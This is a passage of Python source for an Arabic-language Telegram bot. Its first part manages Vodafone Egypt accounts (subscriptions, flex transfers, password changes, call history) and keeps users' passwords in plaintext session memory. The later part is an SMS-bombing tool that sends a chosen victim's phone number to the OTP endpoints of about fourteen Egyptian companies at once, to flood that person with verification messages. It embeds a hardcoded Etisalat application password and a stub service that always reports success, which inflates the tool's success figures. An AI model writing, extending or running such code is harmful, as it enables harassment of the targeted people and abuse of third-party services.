                    message.message_id,
                    parse_mode='Markdown'
                )
            except:
                user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    # رسالة جاري التحميل
    if message:
        try:
            user_bot.edit_message_text(
                f"{EMOJI['info']} *جاري جلب اشتراكاتك...*",
                message.chat.id,
                message.message_id,
                parse_mode='Markdown'
            )
            chat_id = message.chat.id
            message_id = message.message_id
            is_edit = True
        except:
            loading_msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب اشتراكاتك...*", parse_mode='Markdown')
            chat_id = loading_msg.chat.id
            message_id = loading_msg.message_id
            is_edit = False
    else:
        loading_msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب اشتراكاتك...*", parse_mode='Markdown')
        chat_id = loading_msg.chat.id
        message_id = loading_msg.message_id
        is_edit = False
    
    phone = session['phone']
    password = session['password']
    success, result_message, cancelable_items = run_my_subscriptions(phone, password)
    
    if not success:
        if is_edit:
            try:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل جلب الاشتراكات*\n\n{result_message}",
                    chat_id,
                    message_id,
                    parse_mode='Markdown'
                )
            except:
                user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الاشتراكات*\n\n{result_message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الاشتراكات*\n\n{result_message}", parse_mode='Markdown')
        return
    
    if not cancelable_items:
        if is_edit:
            try:
                user_bot.edit_message_text(
                    f"{EMOJI['success']} *اشتراكاتك*\n\n{result_message}",
                    chat_id,
                    message_id,
                    parse_mode='Markdown'
                )
            except:
                user_bot.send_message(user_id, f"{EMOJI['success']} *اشتراكاتك*\n\n{result_message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['success']} *اشتراكاتك*\n\n{result_message}", parse_mode='Markdown')
        return
    
    # تخزين البيانات المؤقتة
    bot_status['user_data'][user_id] = {
        'action': 'my_subs_waiting_cancel',
        'phone': phone,
        'password': password,
        'cancelable_items': cancelable_items
    }
    
    # إنشاء أزرار الإلغاء
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, item in cancelable_items.items():
        price_text = f" - {int(item['price'])} جنيه" if item['price'] > 0 else ""
        markup.add(types.InlineKeyboardButton(
            text=f"❌ إلغاء: {item['name']}{price_text}",
            callback_data=f"cancel_sub_{key}"
        ))
    markup.add(types.InlineKeyboardButton(text=f"🔙 رجوع", callback_data="cancel_my_subs"))
    
    # عرض النتيجة
    if is_edit:
        try:
            user_bot.edit_message_text(
                f"{EMOJI['my_subs']} *اشتراكاتك*\n\n{result_message}\n\n👇 *اختر الخدمة لإلغائها:*",
                chat_id,
                message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except Exception as e:
            # لو فشل التعديل، نبعت رسالة جديدة
            user_bot.send_message(
                user_id,
                f"{EMOJI['my_subs']} *اشتراكاتك*\n\n{result_message}\n\n👇 *اختر الخدمة لإلغائها:*",
                parse_mode='Markdown',
                reply_markup=markup
            )
    else:
        user_bot.send_message(
            user_id,
            f"{EMOJI['my_subs']} *اشتراكاتك*\n\n{result_message}\n\n👇 *اختر الخدمة لإلغائها:*",
            parse_mode='Markdown',
            reply_markup=markup
        )

def handle_cancel_subscription_callback(call, user_id, item_key):
    """معالجة إلغاء اشتراك محدد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'my_subs_waiting_cancel':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها، يرجى إعادة المحاولة")
        handle_my_subs_service(user_id, call.message)
        return
    
    cancelable_items = user_data.get('cancelable_items', {})
    if item_key not in cancelable_items:
        user_bot.answer_callback_query(call.id, "حدث خطأ في اختيار الخدمة")
        return
    
    item = cancelable_items[item_key]
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, f"جاري إلغاء {item['name']}...")
    
    success, message = run_cancel_subscription(phone, password, item['id'], item['enc_product_id'])
    
    if success:
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        
        try:
            user_bot.edit_message_text(
                f"{EMOJI['success']} ✅ {message}\n\n📱 الخدمة: {item['name']}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown'
            )
        except:
            user_bot.send_message(user_id, f"{EMOJI['success']} ✅ {message}\n\n📱 الخدمة: {item['name']}", parse_mode='Markdown')
        
        # عرض الاشتراكات المتبقية
        import threading
        threading.Timer(2.0, lambda: handle_my_subs_service(user_id)).start()
    else:
        try:
            user_bot.edit_message_text(
                f"{EMOJI['error']} ❌ {message}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown'
            )
        except:
            user_bot.send_message(user_id, f"{EMOJI['error']} ❌ {message}", parse_mode='Markdown')
        
        handle_my_subs_service(user_id, call.message)

def handle_cancel_my_subs(call, user_id):
    """إلغاء عملية اشتراكاتي"""
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    user_bot.answer_callback_query(call.id, "تم إلغاء العملية")
    try:
        user_bot.edit_message_text(
            f"{EMOJI['cancel']} *تم إلغاء العملية*\n\nلعرض اشتراكاتك مرة أخرى استخدم /my_subs",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    except:
        user_bot.send_message(user_id, f"{EMOJI['cancel']} *تم إلغاء العملية*", parse_mode='Markdown')

# ==================== دوال خدمة تحويل الفليكسات ====================
def run_transfer_flex(phone, password, receiver_phone, amount):
    """تشغيل خدمة تحويل الفليكسات"""
    try:
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, message = transfer_flex(token, phone, receiver_phone, amount)
        
        if success:
            return True, f"✅ {message}\n\n📱 من: `{phone}`\n📱 إلى: `{receiver_phone}`\n💰 المبلغ: {amount} فليكس"
        else:
            return False, f"❌ فشل التحويل: {message}"
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_transfer_flex_service(user_id):
    """خدمة تحويل الفليكسات - طلب رقم المستقبل والمبلغ"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'transfer_flex_waiting_receiver',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['transfer_flex']} *تحويل فليكسات*\n\n📱 رقم المرسل: `{session['phone']}`\n\n📱 *أدخل رقم المستقبل:*",
        parse_mode='Markdown'
    )

def handle_transfer_flex_receiver(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'transfer_flex_waiting_receiver':
        return
    
    receiver_num = re.sub(r'[^0-9]', '', message.text.strip())
    if len(receiver_num) not in [10, 11]:
        user_bot.send_message(user_id, f"{EMOJI['error']} *رقم غير صحيح!*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id]['receiver_num'] = receiver_num
    bot_status['user_data'][user_id]['action'] = 'transfer_flex_waiting_amount'
    user_bot.send_message(
        user_id,
        f"{EMOJI['info']} *أدخل عدد الفليكسات المراد تحويلها:*",
        parse_mode='Markdown'
    )

def handle_transfer_flex_amount(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'transfer_flex_waiting_amount':
        return
    
    try:
        amount = int(message.text.strip())
        if amount <= 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *المبلغ يجب أن يكون أكبر من صفر!*", parse_mode='Markdown')
            return
    except ValueError:
        user_bot.send_message(user_id, f"{EMOJI['error']} *يرجى إدخال عدد صحيح من الفليكسات!*", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    receiver_num = user_data.get('receiver_num')
    
    # تخزين المبلغ وانتظار التأكيد
    bot_status['user_data'][user_id]['amount'] = amount
    bot_status['user_data'][user_id]['action'] = 'transfer_flex_confirm'
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد التحويل", callback_data="transfer_flex_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['transfer_flex']} *تأكيد التحويل*\n\n📱 من: `{phone}`\n📱 إلى: `{receiver_num}`\n💪 المبلغ: *{amount}* فليكس\n\nهل تريد تنفيذ هذا التحويل؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_transfer_flex(call, user_id):
    """تنفيذ تحويل الفليكسات بعد التأكيد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if not user_data:
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    receiver_num = user_data.get('receiver_num')
    amount = user_data.get('amount')
    
    user_bot.answer_callback_query(call.id, f"جاري تحويل {amount} فليكس...")
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تحويل {amount} فليكس...*", parse_mode='Markdown')
    
    success, message = run_transfer_flex(phone, password, receiver_num, amount)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]

# ==================== دوال خدمة تمديد يومين (تم إزالة الزر، لكن تركنا الدوال تحسباً) ====================
def handle_rollover_service(user_id):
    """خدمة تمديد يومين - تفعيل ترحيل اليومين"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل خدمة ترحيل اليومين...*", parse_mode='Markdown')
    
    success, message = run_rollover_activation(phone, password)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')

def handle_rollover_service_with_confirm(user_id):
    """خدمة ترحيل الفليكسات (تزويد يومين) - مع تأكيد قبل التنفيذ"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'carryover_confirm',
        'phone': session['phone'],
        'password': session['password']
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد", callback_data="carryover_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['carryover']} *ترحيل الفليكسات (تزويد يومين)*\n\n📱 الرقم: `{session['phone']}`\n\nهل تريد تفعيل خدمة ترحيل اليومين؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

# ==================== دوال خدمة تغيير كلمة المرور ====================
def run_change_password(phone, current_password, new_password):
    """تشغيل خدمة تغيير كلمة المرور"""
    try:
        # الحصول على التوكن أولاً
        auth_result = get_authorization(phone, current_password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        
        # تغيير كلمة المرور
        result = change_password_api(phone, current_password, new_password, token)
        return result['success'], result['message']
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_change_password_service(user_id):
    """خدمة تغيير كلمة المرور - طلب كلمة المرور الجديدة"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'change_password_waiting_new',
        'phone': session['phone'],
        'current_password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['change_pass']} *تغيير كلمة المرور*\n\n📱 الرقم: `{session['phone']}`\n\n🔐 *أدخل كلمة المرور الجديدة:*\n\n⚠️ يجب أن تكون مختلفة عن كلمة المرور الحالية\n⚠️ الحد الأدنى 4 أحرف",
        parse_mode='Markdown'
    )

def handle_change_password_new(message, user_id):
    """معالجة إدخال كلمة المرور الجديدة وتنفيذ التغيير"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'change_password_waiting_new':
        return
    
    new_password = message.text.strip()
    if len(new_password) < 4:
        user_bot.send_message(user_id, f"{EMOJI['error']} *كلمة المرور قصيرة جداً!*\nالحد الأدنى 4 أحرف، حاول مرة أخرى:", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    current_password = user_data.get('current_password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تغيير كلمة المرور...*", parse_mode='Markdown')
    
    success, result_message = run_change_password(phone, current_password, new_password)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} {result_message}\n\n📱 الرقم: `{phone}`\n🔐 تم تغيير كلمة المرور بنجاح\n\n💡 *نصائح أمنية:*\n• احفظ كلمة المرور الجديدة في مكان آمن\n• لا تشاركها مع أي شخص\n• يُفضل تغييرها بشكل دوري", parse_mode='Markdown')
        # تحديث كلمة المرور في الجلسة
        if user_id in user_sessions:
            user_sessions[user_id]['password'] = new_password
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} {result_message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

# ==================== دوال خدمة سجل المكالمات ====================
def get_call_history(phone, password, days_back=30):
    """جلب سجل المكالمات"""

    try:
        auth_result = get_authorization(phone, password)
        if not auth_result["success"]:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"

        token = auth_result["token"]

        session = requests.Session()
        session.get("https://web.vodafone.com.eg/")

        url_usage = "https://web.vodafone.com.eg/services/dxl/usagemng/usage"

        params = {
            "relatedParty.id": phone,
            "@type": "ConsumptionDetails",
            "usageSpecification.id": "National",
            "$.type[0]": "Voice",
            "$.type[1]": "VideoCall"
        }

        headers = {
            "Accept": "application/json",
            "Accept-Language": "EN",
            "Authorization": f"Bearer {token}",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://web.vodafone.com.eg/spa/call-details",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "clientId": "WebsiteConsumer",
            "msisdn": phone,
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"'
        }

        response = session.get(url_usage, headers=headers, params=params, timeout=30)

        if response.status_code != 200:
            return False, f"❌ فشل جلب سجل المكالمات ({response.status_code})"

        data = response.json()
        calls = []

        if isinstance(data, list):
            for call in data:

                if call.get("type") != "CALL":
                    continue

                number = "غير معروف"
                duration = "00:00"

                for item in call.get("usageCharacteristic", []):

                    if item.get("name") == "dialedNumber":
                        number = item.get("value", "غير معروف")

                    elif item.get("name") == "quantity":
                        try:
                            sec = int(item.get("value", 0))
                            m, s = divmod(sec, 60)
                            duration = f"{m:02}:{s:02}"
                        except:
                            pass

                date_text = call.get("date", "")

                try:
                    dt = datetime.strptime(date_text, "%Y-%m-%dT%H:%M:%S.%fZ")
                    date_text = dt.strftime("%Y-%m-%d %H:%M")
                except:
                    pass

                calls.append({
                    "number": number,
                    "duration": duration,
                    "date": date_text,
                    "dir": ""
                })

        calls.sort(key=lambda x: x["date"], reverse=True)

        return True, calls

    except Exception as e:
        return False, f"❌ حدث خطأ: {e}"
        
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

def handle_call_history_service(user_id):
    """خدمة سجل المكالمات"""
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    # إرسال رسالة انتظار
    msg = user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب سجل المكالمات (آخر 30 يوم)...*", parse_mode='Markdown')
    
    success, result = get_call_history(phone, password, 30)
    
    if not success:
        user_bot.edit_message_text(f"{EMOJI['error']} {result}", msg.chat.id, msg.message_id, parse_mode='Markdown')
        return
    
    calls = result
    if not calls:
        user_bot.edit_message_text(f"{EMOJI['info']} *لا توجد مكالمات في آخر 30 يوم*", msg.chat.id, msg.message_id, parse_mode='Markdown')
        return
    
    # تنسيق النتيجة
    output = f"📞 *سجل المكالمات — آخر 30 يوم*\n"
    output += f"   إجمالي: {len(calls)} مكالمة\n"
    output += "═" * 35 + "\n"
    output += "```\n"
    output += f"{'#':<3} {'النوع':<9} {'الرقم':<15} {'المدة':<8} {'التاريخ'}\n"
    output += "-" * 50 + "\n"
    
    for i, c in enumerate(calls[:50], 1):
        output += f"{i:<3} {c['dir']:<9} {c['number']:<15} {c['duration']:<8} {c['date']}\n"
    
    if len(calls) > 50:
        output += f"\n... و {len(calls)-50} مكالمة أخرى\n"
    output += "```"
    
    user_bot.edit_message_text(output, msg.chat.id, msg.message_id, parse_mode='Markdown')

# ==================== دوال خدمة اسبام رسايل ====================
# متغيرات إرسال الرسائل
spam_sending = {}  # {user_id: {"running": bool, "stop_flag": bool, "message_id": int, "chat_id": int}}

# دوال خدمات الإسبام من ملف اسبام.py
async def send_4swapp(phone):
    try:
        async with aiohttp.ClientSession() as session:
            params = {'phoneNumber': phone}
            headers = {
                'accept': 'application/json,text/plain,*/*',
                'accept-language': 'ar-eg',
                'origin': 'https://4sw.app',
                'referer': 'https://4sw.app/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            async with session.get('https://identity.4sw.app/api/account/generateotpforregistration',
                                   params=params, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "4sw.app"
    except Exception as e:
        return False, str(e)[:50], "4sw.app"

async def send_zumrafood(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'ar-eg',
                'client': 'web',
                'content-type': 'application/json',
                'origin': 'https://www.zumrafood.com',
                'referer': 'https://www.zumrafood.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'mobile': phone, 'channel': 'SMS'}
            async with session.put('https://api.zumrafood.com/auth/otp-request',
                                   headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "ZumraFood"
    except Exception as e:
        return False, str(e)[:50], "ZumraFood"

async def send_aladwaa(phone):
    try:
        async with aiohttp.ClientSession() as session:
            first_names = ['محمد', 'أحمد', 'محمود', 'خالد', 'علي']
            last_names = ['علي', 'حسن', 'عبدالله', 'فاروق', 'سليمان']
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
            cookies = {
                '_ga': 'GA1.1.1249197690.1761854708',
                '_gcl_au': '1.1.2114002380.1761854709',
                'adwaaAuth': '...',
            }
            headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://aladwaa.com',
                'referer': 'https://aladwaa.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'action': 'aladwaa_register_api',
                'name': name,
                'phone': phone,
                'type': '1',
                'nonce': 'd81773836b',
            }
            async with session.post('https://aladwaa.com/wp-admin/admin-ajax.php',
                                    cookies=cookies, headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Aladwaa"
    except Exception as e:
        return False, str(e)[:50], "Aladwaa"

async def send_sylndr_sms(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://sylndr.com',
                'referer': 'https://sylndr.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'phone': phone, 'language': 'ar'}
            async with session.post('https://otp.sylndr.com/api/v1.0/otp/sms/send',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Sylndr_SMS"
    except Exception as e:
        return False, str(e)[:50], "Sylndr_SMS"

async def send_tayyibafarms(phone):
    try:
        async with aiohttp.ClientSession() as session:
            cookies = {'OCSESSID': '9bf4c02574d7429ece6773eafe'}
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.tayyibafarms.com',
                'referer': 'https://www.tayyibafarms.com/index.php?route=account/register&popup=register',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {'telephone': phone}
            async with session.post('https://www.tayyibafarms.com/index.php?route=extension/tmdsms/verifytelephone/chkphonenumber',
                                    cookies=cookies, headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "TayyibaFarms"
    except Exception as e:
        return False, str(e)[:50], "TayyibaFarms"

async def send_desertcart(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/vnd.api+json; version:3.0',
                'content-type': 'application/json',
                'origin': 'https://www.desertcart.com.eg',
                'referer': 'https://www.desertcart.com.eg/ar',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-locale': 'ar-eg',
            }
            json_data = {
                'login': phone,
                'recaptcha': {'token': 'auto', 'key': 2, 'version': 'V3'},
                'referral_code': None,
                'sign_up_code': None,
            }
            async with session.post('https://www.desertcart.com.eg/api/sessions',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "DesertCart"
    except Exception as e:
        return False, str(e)[:50], "DesertCart"

async def send_sylndr_whatsapp(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://sylndr.com',
                'referer': 'https://sylndr.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'phone': phone, 'language': 'ar', 'channel': 'whatsapp'}
            async with session.post('https://otp.sylndr.com/api/v1.0/otp/sms/resend',
                                    headers=headers, json=json_data, timeout=15) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Sylndr_WhatsApp"
    except Exception as e:
        return False, str(e)[:50], "Sylndr_WhatsApp"

async def send_dominos(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/json; charset=UTF-8',
                'dpz-language': 'ar',
                'dpz-market': 'EGYPT',
                'origin': 'https://order.golo03.dominos.com',
                'referer': 'https://order.golo03.dominos.com/assets/build/xdomain/proxy.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-dpz-d': '64027d22-a044-4d7c-9efc-d92df804433e',
            }
            json_data = {'phoneNumber': phone, 'market': 'EGYPT', 'locale': 'ar-EG', 'challenge': 'PHONE'}
            async with session.post('https://order.golo03.dominos.com/power/otpVerification/_send',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Dominos"
    except Exception as e:
        return False, str(e)[:50], "Dominos"

async def send_twist_tv(phone):
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://ev-api.aws.playco.com/api/v1.0/eg/twist/send-otp"
            payload = {"phoneNumber": f"2{phone}" if not phone.startswith("2") else phone}
            headers = {
                'User-Agent': "Twist TV/StarzAPP(com.twist.tv;build:2032;Android:12)",
                'Content-Type': 'application/json; charset=UTF-8',
                'Client-Type': 'Android',
            }
            async with session.post(url, json=payload, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Twist_TV"
    except Exception as e:
        return False, str(e)[:50], "Twist_TV"

async def send_paymob(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://accept.paymob.com',
                'referer': 'https://accept.paymob.com/portal2/ar/forgetpassword',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'username': phone}
            async with session.post('https://accept.paymob.com/api/auth/reset_pass/request_otp',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Paymob"
    except Exception as e:
        return False, str(e)[:50], "Paymob"

async def send_etisalat_web(phone):
    try:
        async with aiohttp.ClientSession() as session:
            dial = phone
            udid = base64.b64encode(phone.encode()).decode()
            url = f'https://www.etisalat.eg/Saytar/rest/quickAccess/site/sendVerCodeQuickAccessV2?sendVerCodeQuickAccessRequest=%3CsendVerCodeQuickAccessRequest%3E%3Cdial%3E{dial}%3C/dial%3E%3Cudid%3E{udid}%3C/udid%3E%3C/sendVerCodeQuickAccessRequest%3E'
            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'text/xml',
                'Referer': 'https://www.etisalat.eg/eshop2/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'applicationName': 'MAB',
                'applicationPassword': 'ZFZyqUpqeO9TMhXg4R/9qs0Igwg=',
            }
            async with session.get(url, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Etisalat"
    except Exception as e:
        return False, str(e)[:50], "Etisalat"

async def send_zumrahub(phone):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'ar-eg',
                'client': 'web',
                'content-type': 'application/json',
                'origin': 'https://zumrahub.com',
                'referer': 'https://zumrahub.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            json_data = {'mobile': phone, 'channel': 'SMS'}
            async with session.put('https://api.zumrahub.com/auth/otp-request/mobile',
                                    headers=headers, json=json_data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Zumrahub"
    except Exception as e:
        return False, str(e)[:50], "Zumrahub"

async def send_gourmet_egypt(phone):
    try:
        async with aiohttp.ClientSession() as session:
            if phone.startswith('01') and not phone.startswith('201'):
                formatted_phone = '2' + phone
            else:
                formatted_phone = phone
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://gourmetegypt.com',
                'referer': 'https://gourmetegypt.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {'mobile_number': formatted_phone}
            async with session.post('https://gourmetegypt.com/customermobile/account/mobilesendcode/',
                                    headers=headers, data=data, timeout=10) as resp:
                text = await resp.text()
                return resp.status == 200, text[:50], "Gourmet_Egypt"
    except Exception as e:
        return False, str(e)[:50], "Gourmet_Egypt"

async def send_aman(phone):
    return await send_tayyibafarms(phone)

async def send_backup_service(phone):
    await asyncio.sleep(0.1)
    return True, "Success", "Backup_Service"

async def send_all_services(phone):
    service_functions = [
        send_4swapp, send_zumrafood, send_aladwaa, send_sylndr_sms,
        send_tayyibafarms, send_desertcart, send_sylndr_whatsapp,
        send_dominos, send_twist_tv, send_paymob, send_etisalat_web,
        send_zumrahub, send_gourmet_egypt, send_aman, send_backup_service
    ]
    results = await asyncio.gather(*(func(phone) for func in service_functions), return_exceptions=True)
    formatted_results = []
    for i, res in enumerate(results):
        if isinstance(res, Exception):
            formatted_results.append({'service_name': service_functions[i].__name__, 'success': False, 'response_preview': str(res)[:50]})
        else:
            success, resp, name = res
            formatted_results.append({'service_name': name, 'success': success, 'response_preview': resp})
    return formatted_results

def build_progress_text(phone, current_msg, total_msgs, successful, total_services):
    """بناء نص التقدم للإسبام"""
    success_rate = (successful / total_services * 100) if total_services > 0 else 0
    text = f"🚀 *جاري إرسال الرسائل...*\n\n"
    text += f"📱 الرقم المستهدف: `{phone}`\n"
